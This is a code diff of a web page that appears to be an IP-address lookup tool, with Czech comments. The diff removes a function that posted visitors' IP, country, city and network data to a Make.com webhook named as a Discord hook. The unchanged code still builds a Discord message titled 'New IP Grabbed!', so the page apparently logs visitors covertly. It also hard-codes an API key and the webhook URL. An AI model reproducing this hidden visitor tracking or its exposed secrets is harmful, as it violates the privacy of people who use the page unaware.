@@ -89,33 +89,13 @@
         Data provided by <a href="https://ip2location.io" target="_blank" class="hover:text-slate-400 underline">IP2Location.io</a>
     </footer>
 
-    <!-- JavaScript logic -->
-<script>
-    // --- CONFIGURATION ---
-    const API_KEY = '10D1DD103AB750F405A5CD9039EA10A9';
-    const DISCORD_WEBHOOK_URL = 'https://hook.eu1.make.com/35ucd6h55lc948mqse18sakjpm6ekhhg';
-    // ---------------------
+<!-- JavaScript logic -->
+    <script>
+        // --- CONFIGURATION ---
+        const API_KEY = '10D1DD103AB750F405A5CD9039EA10A9';
+        const DISCORD_WEBHOOK_URL = 'https://hook.eu1.make.com/35ucd6h55lc948mqse18sakjpm6ekhhg';
+        // ---------------------
 
-    // Funkce pro odeslání dat na Discord přes Make.com
-    function sendToDiscord(ipData) {
-        fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                ip: ipData.ip,
-                country: ipData.country_name,
-                city: ipData.city,
-                as: ipData.as
-            })
-        })
-        .catch(error => {
-            console.error('Chyba při odesílání webhooku:', error);
-        });
-    }
-</script>
-   <script> 
         const ipInput = document.getElementById('ipInput');
         const searchBtn = document.getElementById('searchBtn');
         const myIpBtn = document.getElementById('myIpBtn');
@@ -181,7 +161,7 @@
             const discordPayload = {
                 embeds: [{
                     title: "🔍 New IP Grabbed!",
-                    color: 16766720, // Pěkná žlutá/jantarová barva postranního proužku v Discordu
+                    color: 16766720,
                     fields: [
                         { name: "IP Address", value: `\`${apiData.ip || 'N/A'}\``, inline: true },
                         { name: "Country", value: `${apiData.country_name || 'N/A'} (${apiData.country_code || 'N/A'})`, inline: true },
